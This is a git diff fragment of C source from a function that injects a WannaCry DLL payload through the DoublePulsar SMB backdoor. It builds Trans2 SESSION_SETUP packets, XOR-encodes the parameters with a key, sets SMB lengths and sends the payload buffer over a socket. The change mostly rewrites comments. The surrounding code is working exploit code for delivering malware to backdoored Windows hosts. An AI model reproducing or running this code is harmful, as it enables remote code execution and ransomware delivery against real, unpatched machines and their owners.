@@ -344,17 +344,20 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 			Parametersbuffer[i] ^= byte_xor_key[i % 4];
 		}
 		
-		//size 70
+		//wannacry_Trans2_Request is 70 bytes
 		memcpy((unsigned char*)send_buffer, (unsigned char*)wannacry_Trans2_Request, 70);
+		
 		//update last packet SMB Length
 		unsigned short smblen;
-		smblen = bytesLeft + 70 + 12 - 4; //BytesLeft + DoublePulsar Exec Packet Length + Trans2 SESSION_SETUP parameters - 4 since netBIOS isn't counted
+
+		//smblen = BytesLeft + DoublePulsar Exec Packet Length + Trans2 SESSION_SETUP parameters - 4 since netBIOS isn't counted
+		smblen = bytesLeft + 70 + 12 - 4;
 		unsigned short smb_length_value = htons(smblen);
-		//memcpy(buffer+2, &smblen, 2);
 		memcpy(buffer + 2, &smb_length_value, 2);
 
-		//copy parameters
+		//copy parameters to offset 70 ( after trans2 execution packet )
 		memcpy(send_buffer + 70 , Parametersbuffer, 12);
+		
 		//copy last payload size = bytesLeft
 		memcpy(send_buffer + 82, (char *)hMem + ctx, bytesLeft);
 		send(socket, (char*)send_buffer, bytesLeft+82, 0);
